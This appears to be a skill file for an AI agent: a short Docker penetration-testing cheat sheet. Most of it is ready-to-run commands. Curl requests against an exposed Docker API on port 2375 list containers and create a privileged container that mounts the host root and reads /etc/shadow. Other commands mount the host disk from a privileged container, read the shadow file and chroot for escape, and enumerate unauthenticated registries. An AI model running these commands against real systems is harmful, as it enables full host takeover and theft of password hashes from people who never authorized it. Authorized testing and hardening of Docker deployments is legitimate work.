---
name: docker-security
description: Docker security testing covering socket exposure, container escape, registry authentication bypass, and privileged container abuse
---

# Docker Security Testing

## Key Vulnerabilities

### Docker Socket Exposure

```bash
# Docker daemon API (if socket/TCP exposed)
curl -sk http://TARGET:2375/version
curl -sk http://TARGET:2375/containers/json
curl -sk http://TARGET:2375/images/json
curl -sk http://TARGET:2376/info

# Create privileged container with host mount
curl -sk http://TARGET:2375/containers/create -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/mnt/etc/shadow"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'
```

### Container Escape via Privileged Mode

```bash
# Inside privileged container — mount host filesystem
mkdir /mnt/host && mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow
chroot /mnt/host
```

### Docker Registry

```bash
# Unauthenticated registry access
curl -sk https://TARGET:5000/v2/_catalog
curl -sk https://TARGET:5000/v2/IMAGE_NAME/tags/list
curl -sk https://TARGET:5000/v2/IMAGE_NAME/manifests/latest
```

## Pro Tips

1. Docker socket on port 2375 (HTTP) or 2376 (HTTPS) = full host compromise
2. Check `/var/run/docker.sock` mount inside containers — enables container escape
3. Container registries on port 5000 often lack authentication — list all images
4. Privileged containers can mount host filesystem and escape completely
